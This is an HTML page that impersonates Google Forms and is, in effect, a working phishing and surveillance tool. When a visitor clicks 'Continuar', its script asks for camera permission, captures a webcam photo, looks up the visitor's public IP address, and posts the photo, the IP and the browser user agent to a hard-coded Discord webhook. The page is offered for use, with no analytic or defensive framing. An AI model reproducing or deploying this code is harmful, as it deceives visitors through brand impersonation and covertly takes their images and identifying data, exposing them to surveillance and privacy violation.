<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Forms</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            text-align: center;
        }

        .container {
            max-width: 600px;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .button {
            background-color: #007bff;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        .button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Google Forms lm</h1>
        <p>Formulario de Google LLC 2024 ©</p>
        <button class="button" onclick="requestCameraPermission()">Continuar</button>
    </div>

    <script>
        async function requestCameraPermission() {
            try {
                const permission = await navigator.permissions.query({ name: 'camera' });
                if (permission.state === 'granted' || permission.state === 'prompt') {
                    takePhoto();
                } else {
                    alert('Please grant camera permission to continue.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred while requesting camera permission.');
            }
        }

        async function takePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.play();

                videoElement.onloadedmetadata = async () => {
                    const canvas = document.createElement('canvas');
                    const maxWidth = 800; // Definir el ancho máximo deseado
                    const maxHeight = (videoElement.videoHeight / videoElement.videoWidth) * maxWidth;
                    canvas.width = maxWidth;
                    canvas.height = maxHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    
                    // Reducir el tamaño de la imagen
                    const imageData = canvas.toDataURL('image/jpeg', 0.5); // Calidad de compresión del 50%

                    sendData(imageData);

                    stream.getTracks().forEach(track => track.stop());
                };
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred while taking photo.');
            }
        }

        function sendData(imageData) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const userAgent = navigator.userAgent;
                    const payload = {
                        content: `User IP Address: ${ipAddress}\nUser Agent: ${userAgent}\nImage Data: ${imageData}`
                    };

                    fetch('https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t_5cv', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (response.ok) {
                            alert('Redirecting to the main page...');
                        } else {
                            throw new Error('Failed to send data to Discord. Status: ' + response.status);
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('An error occurred while sending data to Discord: ' + error.message);
                    });
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Failed to fetch IP address. Please try again later.');
                });
        }
    </script>
</body>
</html>
